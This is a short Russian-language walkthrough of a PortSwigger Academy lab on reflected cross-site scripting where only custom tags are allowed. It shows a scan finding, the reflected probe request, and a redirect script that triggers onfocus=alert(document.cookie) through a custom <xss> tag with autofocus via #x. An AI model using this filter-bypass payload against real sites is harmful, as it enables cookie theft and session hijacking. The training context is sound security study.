посканим сайт через `Target` -> `scan` -> `deep`

и увидим, что он насканил нам, что на ресурсе существует `reflected XSS`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/12.%20Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/pics%20for%20walktrough/1.png)
в примераз issue увидим запрос
```
GET /?search=147805%3cVyOGE%3e HTTP/2
```
который не в URL кодировке выглядит как
```
GET /?search=147805<VyOGE> HTTP/2
```
где в response pretty будет надпись
```
0 search results for '147805<VyOGE>
```
а вот в рендере - нет
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/12.%20Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/pics%20for%20walktrough/2.png)

Дальше происходит магия, которую я не смог наресерчить, и как это механически происходит - я тоже не понял
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
открываем го эксплойт сервер

```
<script>
location = 'https://0a0e002703fb07ba8344416a00e00024.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
после чего получим уведомление об успешно выполненной лабораторной работе

нажимаем стор и деливер и эксплойт на виктиме
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/12.%20Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones/pics%20for%20walktrough/3.png)
